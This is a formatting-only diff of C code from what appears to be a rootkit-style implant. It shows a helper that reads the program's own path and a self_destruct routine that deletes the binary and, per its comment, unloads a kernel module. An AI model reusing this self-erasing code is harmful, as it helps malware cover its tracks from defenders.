@@ -1,10 +1,10 @@
-#include "inc/kernel.h"
 #include "inc/util.h"
+#include "inc/kernel.h"
 #include "inc/save.h"
 
+#include <stdbool.h>
 #include <sys/socket.h>
 #include <sys/stat.h>
-#include <stdbool.h>
 
 #include <dirent.h>
 #include <stdarg.h>
@@ -287,17 +287,17 @@ end:
 char *get_self(char *path) {
   bool allocated = false;
 
-  if(NULL == path){
-    path = malloc(PATH_MAX+1);
+  if (NULL == path) {
+    path      = malloc(PATH_MAX + 1);
     allocated = true;
   }
 
-  bzero(path, PATH_MAX+1);
+  bzero(path, PATH_MAX + 1);
 
-  if(readlink("/proc/self/exe", path, PATH_MAX+1) > 0)
+  if (readlink("/proc/self/exe", path, PATH_MAX + 1) > 0)
     return path;
 
-  if(allocated)
+  if (allocated)
     free(path);
 
   return NULL;
@@ -309,8 +309,8 @@ char *get_self(char *path) {
  * then it unloads the kernel module
 
 */
-void self_destruct(){
-  char self[PATH_MAX+1];
+void self_destruct() {
+  char self[PATH_MAX + 1];
 
   // no need to delete anything in debug mod
   if (SHRK_DEBUG)
@@ -321,8 +321,8 @@ void self_destruct(){
     debug("failed to obtain self path");
     goto skip_self;
   }
-   
-  if(unlink(self) != 0){ 
+
+  if (unlink(self) != 0) {
     debug_err("failed to unlink the self");
     return;
   }
